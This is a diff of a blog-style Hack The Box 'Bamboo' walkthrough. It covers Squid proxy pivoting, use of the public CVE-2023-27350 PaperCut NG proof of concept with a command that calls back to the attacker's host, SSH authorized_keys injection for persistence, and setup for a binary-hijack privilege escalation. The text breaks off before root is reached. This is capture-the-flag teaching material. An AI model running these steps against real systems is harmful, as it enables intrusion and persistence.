@@ -7,25 +7,28 @@ TocOpen: true
 tags:
   - blog
   - HTB
-  - medium
-  - Linux
-  - tcp-3128-http-web-proxy
-  - CMS-PaperCut-NG-22.0-rce
-  - Linux-Privilege-Escalation-Binary-Hijack
-lastmod: 2026-03-29T11:36:56.409Z
+lastmod: 2026-03-22T19:55:21.343Z
 ---
 # Box Info
 
 {{< htb-info "https://www.hackthebox.com/machines/Bamboo" >}}
 
-# Recon
+***
 
-### PORT & IP SCAN
+Finally use the  `AutoHotkey` that will detect the tedsadsa@linux:~/ like that
+
+```
+tedsadsa@linux:~/Desktop$ whoami 
+```
+
+# Recon 10.129.234.X
+
+### \[\[PORT & IP SCAN]]
 
 The `nmap` reveal that the machine has the port of 22 and 3128 for squid-http , remember to use the `--min-rate` , otherwise , the `nmap` scan can scan for 1 day
 
 ```
-parallels@ubuntu-linux-2404:~/Desktop$ sudo nmap  -p-  -vv -reason -T 5  -o openPort.txt 10.129.238.16 --min-rate 500
+test $ sudo nmap  -p-  -vv -reason -T 5  -o openPort.txt 10.129.238.16 --min-rate 500
 Nmap scan report for 10.129.238.16
 Host is up, received echo-reply ttl 63 (0.66s latency).
 Scanned at 2026-03-16 07:30:34 HKT for 395s
@@ -60,21 +63,15 @@ Nmap done: 1 IP address (1 host up) scanned in 45.47 seconds
            
 ```
 
-`3128` is the port which will use the proxy to arrive the internal network , normally it will be used for Filtering traffic (e.g., for parental controls or company policies), Controlling internet usage via ACLs (Access Control Lists).
+### SSH 22
 
-Normally, the `Squid` can be Auth with password , but it don't do it ! ! !
+The SSH is the 3ubuntu0 for the Linux , nothing find in here
 
-### 3128 tcp
+### 3128/tcp
 
-{{< toggle "Tag 🏷️" >}}
+The (VerylazyTech)\[https://www.verylazytech.com/squid-port-3128] say that **Port 3128** is widely associated with **Squid**, a caching and forwarding HTTP web proxy. While it can improve performance and control web access, misconfigured instances can expose systems to security vulnerabilities. In this article, we’ll explore how to identify, assess, and safely exploit Squid proxies during a penetration test—strictly in authorized environments.
 
-{{< tag "tcp-3128-http-web-proxy" >}} Port 3128 is widely associated with **Squid**, a caching and forwarding HTTP web proxy. While it can improve performance and control web access, misconfigured instances can expose systems to security vulnerabilities. In this article, we’ll explore how to identify, assess, and safely exploit Squid proxies during a penetration test—strictly in authorized environments.
-
-{{< /toggle >}}
-
-The [VerylazyTech](https://www.verylazytech.com/squid-port-3128) say that **Port 3128** is widely associated with **Squid**, a caching and forwarding HTTP web proxy. While it can improve performance and control web access, misconfigured instances can expose systems to security vulnerabilities. In this article, we’ll explore how to identify, assess, and safely exploit Squid proxies during a penetration test—strictly in authorized environments.
-
-[HackTrick](https://hacktricks.wiki/en/network-services-pentesting/3128-pentesting-squid.html) has the good reference to step by step to pen-test it
+Base on HackTrick\[https://hacktricks.wiki/en/network-services-pentesting/3128-pentesting-squid.html] to pentest it
 
 ```
 tester@linux$ git clone https://github.com/aancw/spose.git
@@ -98,10 +95,6 @@ localhost:9192 seems OPEN
 localhost:9195 seems OPEN
 ```
 
-The port of `22`,`9191`,`9192`,`9195` are opened but it only can be viewed by proxy
-
-Thereforce , i will add the http proxy to proxychains.conf
-
 **Proxychains for HTTP interaction:** append a strict HTTP entry at the bottom of `/etc/proxychains.conf`:
 
 ```shell
@@ -112,8 +105,6 @@ http    10.129.238.16   3128
 ![Pasted image 20260321124035.png](/ob/Pasted%20image%2020260321124035.png)
 
 Then interact with internal listeners (e.g., a web UI bound to 127.0.0.1) transparently through Squid:
-
-Successfully request the 9191 by `proxychains` , but it return to 301 , if i want to see what is it , then I need to check it in browser .
 
 ```AutoHotkey
 $ proxychains curl http://127.0.0.1:9191 -v
@@ -138,57 +129,21 @@ $ proxychains curl http://127.0.0.1:9191 -v
 * Connection #0 to host 127.0.0.1:9191 left intact
 ```
 
-The `proxychain` with `curl` is success , but i want to check the UI.
-
-Use the Burpsuite 's Upstream proxy servers that will enable me to go to the `9191` 's web UI
+I already have my [Firefox set up with FoxyProxy](https://www.youtube.com/watch?v=iTm33Miymdg) to proxy all my CTF traffic through Burp. I’ll go into Burp –> Proxy –> Settings –> Network –> Connections –> Upstream proxy servers and add this Squid instance:
 
 ![Pasted image 20260321124926.png](/ob/Pasted%20image%2020260321124926.png)
 
-Proxy host set to be machine IP\
-Proxy port will be 3128 the nmap scaned port\
 ![Pasted image 20260321125201.png](/ob/Pasted%20image%2020260321125201.png)
-
-In the `burp` need to `Open browser`  which is default closed , you need to turn it on.
-
-# Shell as papercut
-
-{{< toggle "Tag 🏷️" >}}
-
-{{< tag "CMS-PaperCut-NG-22.0-rce" >}} Found the PaperCut CMS in the port 9191 proxy ,and which is easily attacked by RCE
-
-{{< mindmap >}}
-
-# proxy 9191
-
-# PaperCut CMS 22.0
-
-# CVE-2023-27350
-
-## revshell
-
-## SSH key inject
-
-{{< /mindmap >}}
-
-{{< /toggle >}}
-
-### POC
-
-`http://127.0.0.1:9191` will redirect to `http://127.0.0.1:9191/user`
 
 ![Pasted image 20260321130822.png](/ob/Pasted%20image%2020260321130822.png)
 
-The UI show the the web version and CMS version
+Let me find the `PaperCut NG 22.0` ' s CVE
 
-`PaperCut NG 22.0`
-
-The [horizon3ai](https://github.com/horizon3ai/CVE-2023-27350) has the good python POC to do it , but you need to review what is the code is doing
-
+https://github.com/horizon3ai/CVE-2023-27350\
+POC\
 ![Pasted image 20260321133135.png](/ob/Pasted%20image%2020260321133135.png)
 
-`proxychains` with `-q` to run the POC
-
-```
+```AutoHotkey
 tester@linux$ proxychains -q  python3 CVE-2023-27350.py.1 -u http://127.0.0.1:9191/ -c 'curl http://10.10.16.4'
 [*] Papercut instance is vulnerable! Obtained valid JSESSIONID
 [*] Updating print-and-device.script.enabled to Y
@@ -199,17 +154,15 @@ tester@linux$ proxychains -q  python3 CVE-2023-27350.py.1 -u http://127.0.0.1:91
 [*] Updating print.script.sandboxed to Y
 ```
 
-Open the http server for POC
-
 ```AutoHotkey
 tester@linux$ python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 10.129.238.16 - - [21/Mar/2026 13:29:25] "GET / HTTP/1.1" 200 -
 ```
 
-### Revshell
-
-Download the revshell script first , and then run the rveshell script for solve the problem of the web dont have the access to directly run the code
+```shell
+python3 -m http.server 80
+```
 
 Create the shell
 
@@ -248,12 +201,6 @@ tester@linux$ proxychains -q  python3 CVE-2023-27350.py.1 -u http://127.0.0.1:91
 [*] Updating print.script.sandboxed to Y
 ```
 
-After own the user in the shell , i would like to have the ssh for more stable login
-
-### SSH Authorized Keys Injection (T1098.004)
-
-use the `ssh-keygen` to have the private key and public key in the `~/.ssh`
-
 ```shell
 tester@linux$ ssh-keygen -t ed25519 -C "haydon@kali-$(date +%Y%m%d)"
 Generating public/private ed25519 key pair.
@@ -266,7 +213,7 @@ Your identification has been saved in /home/parallels/.ssh/id_ed25519
 Your public key has been saved in /home/parallels/.ssh/id_ed25519.pub
 The key fingerprint is:
 SHA256:/zNh5RrEzhD4IfFZr3NYShyBgaVUzgiukplJs7Xt8Mo haydon@kali-20260321
- 
+The key's randomart image is:
 +--[ED25519 256]--+
 |      . o*+o+.   |
 |     . o+*++ o   |
@@ -280,31 +227,25 @@ SHA256:/zNh5RrEzhD4IfFZr3NYShyBgaVUzgiukplJs7Xt8Mo haydon@kali-20260321
 +----[SHA256]-----+
 ```
 
-`cat` the public key within here is id\_ed25519.pub for copy-and-paste to target shell
-
 ```shell
 tester@linux$ ls ~/.ssh                                                           
 id_ed25519  id_ed25519.pub
                                                                                                                                                                              
 tester@linux$ cd ~/.ssh             
-tester@linux$ cat id_ed25519.pub 
+                                                                                tester@linux$ cat id_ed25519.pub 
 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKM1/F1Xu38W1tZp67JhMCEUxH6ati6tvd850oRkaZeV haydon@kali-20260321
                                                                             
 
 ```
 
-back the bamboo shell , `echo` the key to the new file `authorized_keys`
-
 ```
-papercut@bamboo:~/.ssh$ echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKM1/F1Xu38W1tZp67JhMCEUxH6ati6tvd850oRkaZeV haydon@kali-20260321' > authorized_keys
+tester@linux$ echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKM1/F1Xu38W1tZp67JhMCEUxH6ati6tvd850oRkaZeV haydon@kali-20260321' > authorized_keys
 <d850oRkaZeV haydon@kali-20260321' > authorized_keys
 papercut@bamboo:~/.ssh$ ls
 ls
 authorized_keys
 papercut@bamboo:~/.ssh$ 
 ```
-
-Once inject the public key , that will enable to login the ssh
 
 ```
 tester@linux$ ssh -i ~/.ssh/id_ed25519 papercut@10.129.238.16       
@@ -345,89 +286,25 @@ papercut@bamboo:~$
 
 ```
 
-# Shell as Root
-
-{{< toggle "Tag 🏷️" >}}
-
-{{< tag "Linux-Privilege-Escalation-Binary-Hijack" >}} In /home/papercut/server/bin/linux-x64 there are a bunch of binaries, To exploit this is simple. papercut controls that directory and binary of the printer function ,and then move the script, and create my own to change the script by `pipe` to have the root
-
-{{< mindmap >}}
-
-# Foothold
-
-# home directory
-
-* PaperCut install
-  * nothing can do
-
-# /etc/passwd
-
-* root
-* ubuntu
-* papercut
-
-## pspy
-
-* PaperCut
-  * printer bug
-    * Binary Hijack
-      * root
-
-# root
-
-{{< /mindmap >}}
-
-{{< /toggle >}}
-
-found the `root` , `ubuntu` , `papercut`
-
-```
-papercut@bamboo:~$ cat /etc/passwd | grep 'sh$'
-root:x:0:0:root:/root:/bin/bash
-ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
-papercut:x:1001:1001:,,,:/home/papercut:/bin/bash
-```
-
-The papercut user’s home directory is pretty empty other than the PaperCut install:
-
-```
-papercut@bamboo:~$ ls -la
-total 324
-drwxr-xr-x  8 papercut papercut   4096 Sep 30 16:30 .
-drwxr-xr-x  4 root     root       4096 May 26  2023 ..
-lrwxrwxrwx  1 root     root          9 Sep 30 16:30 .bash_history -> /dev/null
--rw-r--r--  1 papercut papercut    220 May 26  2023 .bash_logout
--rw-rw-r--  1 papercut papercut     74 May 26  2023 .bash_profile
--rw-r--r--  1 papercut papercut   3771 May 26  2023 .bashrc
--rw-r--r--  1 papercut papercut    102 Sep 29  2022 .install-config
-drwxrwxr-x  3 papercut papercut   4096 May 26  2023 .local
--rw-r--r--  1 papercut papercut    881 May 26  2023 .profile
--rwxr-xr-x  1 papercut papercut  50569 Sep 29  2022 LICENCE.TXT
--rwxr-xr-x  1 papercut papercut   1537 Sep 29  2022 README-LINUX.TXT
--rwxr-xr-x  1 papercut papercut 212715 Sep 29  2022 THIRDPARTYLICENSEREADME.TXT
-drwxr-xr-x  5 papercut papercut   4096 May 26  2023 client
-lrwxrwxrwx  1 papercut papercut     24 May 26  2023 docs -> server/data/content/help
-drwxr-xr-x  9 papercut papercut   4096 May 26  2023 providers
-drwxr-xr-x  6 papercut papercut   4096 May 26  2023 release
-drwxr-xr-x  5 papercut papercut   4096 May 26  2023 runtime
-drwxr-xr-x 13 papercut papercut   4096 May 26  2023 server
--rwxr-xr-x  1 papercut papercut   3099 Sep 29  2022 uninstall
--rw-r-----  1 root     papercut     33 Jan 27 23:51 user.txt
-```
-
-### PSPY64
+### Enumeration
 
 ```
 wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
-
 python3 -m http.server 80 
 10.129.238.16 - - [21/Mar/2026 14:43:15] "GET /pspy64 HTTP/1.1" 200 -
-```
-
-After download , just run it like before we do it
 
 ```
-papercut@bamboo:~$ chmod +x pspy64
+
+```AutoHotkey
+
+Last login: Sat Mar 21 06:13:12 2026 from 10.10.16.4
+papercut@bamboo:~$ 
+papercut@bamboo:~$ 
+papercut@bamboo:~$ 
+papercut@bamboo:~$ ls
+LICENCE.TXT                  client     pspy64   server     yes
+README-LINUX.TXT             docs       release  uninstall  yes.pub
+THIRDPARTYLICENSEREADME.TXT  providers  runtime  user.txt
 papercut@bamboo:~$ timeout  120 ./pspy64  -pf -i 1000
 pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d
 
@@ -1491,29 +1368,21 @@ done
 
 There’s nothing interesting happening on a cron. Exploring all the settings on the website, eventually I’ll find something interesting. Under “Enable Printing”, I’ll click the little “<” at the right side:
 
-### PaperCut Ng Printer
-
-Browser http://127.0.0.1:9191/app?service=page/SetupCompleted , and login
+go to get http://127.0.0.1:9191/app?service=page/SetupCompleted
 
 ![Pasted image 20260321150509.png](/ob/Pasted%20image%2020260321150509.png)
 
-After login , choose the `Enable Printing` and `Import BYOB-friend print queues`
+![Pasted image 20260321150525.png](/ob/Pasted%20image%2020260321150525.png)
 
 ![Pasted image 20260321151022.png](/ob/Pasted%20image%2020260321151022.png)
 
-choose the `Start importing Mobility Print printers`
-
 ![Pasted image 20260321151102.png](/ob/Pasted%20image%2020260321151102.png)
-
-server-command is owned by root to run
 
 ```
 2026/03/21 07:13:34 CMD: UID=0     PID=38105  | /bin/sh /home/papercut/server/bin/linux-x64/server-command get-config health.api.key 
 ```
 
 To exploit this is simple. papercut controls that directory and binary:
-
-high recommand to know what command is runed by `root`
 
 ```
 papercut@bamboo:~/server/bin/linux-x64$ ls -al 
